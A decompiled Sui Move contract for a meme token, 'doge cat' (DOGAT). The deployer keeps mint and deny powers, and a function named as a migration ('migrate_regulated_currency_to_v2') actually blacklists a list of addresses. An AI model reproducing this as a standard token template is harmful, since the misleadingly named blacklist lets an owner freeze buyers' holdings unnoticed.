module 0x3a9aa61bb23b18338f73b9c41e06fc6b032308b83e29681f4d42c024e3eb8306::dogat {
    struct DOGAT has drop {
        dummy_field: bool,
    }

    public fun add_addr_to_deny_list(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DOGAT>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: DOGAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DOGAT>(arg0, 9, b"doge cat", b"DOGAT", x"e2809c536f20736f6d656f6e6520746f6c64206d652049206861766520746865206361742076657273696f6e206f662074686520646f6765206d656d65e2809d", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/5pQSTDfeUppb6tV415RWygL8n3ctyakBTV7QzBn5pump.png?size=xl&key=578d76")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DOGAT>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOGAT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<DOGAT>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOGAT>>(v1, 0x2::tx_context::sender(arg1));
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGAT>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_v2_contains_next_epoch<DOGAT>(arg0, v1)) {
                0x2::coin::deny_list_v2_add<DOGAT>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

